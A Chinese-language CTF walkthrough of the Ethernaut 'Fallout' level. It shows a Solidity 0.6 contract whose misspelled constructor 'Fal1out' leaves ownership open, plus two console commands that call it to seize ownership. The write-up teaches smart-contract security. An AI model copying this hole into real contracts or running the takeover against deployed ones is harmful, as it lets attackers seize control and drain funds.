# Fallout

> 获得以下合约的所有权来完成这一关.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  // constructor 
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

## 攻击思路

此合约版本为0.6.0。此时合约的构造函数为合约的同名函数。最新版本0.8.0中，已使用constructor函数代替同名函数作为构造函数。

此合约的构造函数写错了，Fal1out != Fallout 。即合约部署后，并没有初始化owner。

```js
await contract.owner()
'0x0000000000000000000000000000000000000000'
```

所以只需要调用 Fal1out函数即得到owner权限

```js
// 调用时并没有发送ETH
await contract.Fal1out()

// 查询最新合约的owner
await contract.owner()

```

提交合约实例，完成目标。